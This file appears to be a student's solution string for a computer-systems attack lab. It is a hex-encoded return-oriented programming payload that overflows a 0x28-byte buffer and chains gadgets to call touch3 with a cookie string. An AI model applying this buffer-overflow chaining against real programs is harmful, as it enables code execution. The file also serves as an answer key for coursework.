00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* 0x28个0填满getbuf */
06 1a 40 00 00 00 00 00 /* gadget1 */
a2 19 40 00 00 00 00 00 /* gadget2 */
cc 19 40 00 00 00 00 00 /* gadget3 */
48 00 00 00 00 00 00 00 /* offset */
dd 19 40 00 00 00 00 00 /* gadget4 */
69 1a 40 00 00 00 00 00 /* gadget5 */
13 1a 40 00 00 00 00 00 /* gadget6 */
d6 19 40 00 00 00 00 00 /* gadget7 */
a2 19 40 00 00 00 00 00 /* gadget8 */
fa 18 40 00 00 00 00 00 /* touch3 */
35 39 62 39 39 37 66 61 00 /* cookie's ascii */